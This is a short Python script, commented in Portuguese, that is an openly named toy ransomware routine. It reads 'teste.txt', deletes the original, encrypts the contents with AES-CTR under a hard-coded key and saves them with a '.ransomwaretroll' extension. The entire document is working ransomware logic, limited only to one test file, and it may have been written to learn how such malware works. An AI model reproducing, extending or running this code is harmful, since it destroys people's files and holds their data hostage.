import os
import pyaes

# ABRE O AQUIVO A SER CRIPTOGRAFADO
file_name = "teste.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

# REMOVE O ARQUIVO
os.remove(file_name)

# CHAVE CRIPTOGRAFADO
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

# CRIPTOGRAFA O ARQUIVO
crypto_data = aes.encrypt(file_data)

# SALVA O ARQUIVO NOVO CRIPTOGRAFADO
new_file = file_name + ".ransomwaretroll"
new_file = open(f'{new_file}', 'wb')
new_file.write(crypto_data)
new_file.close()
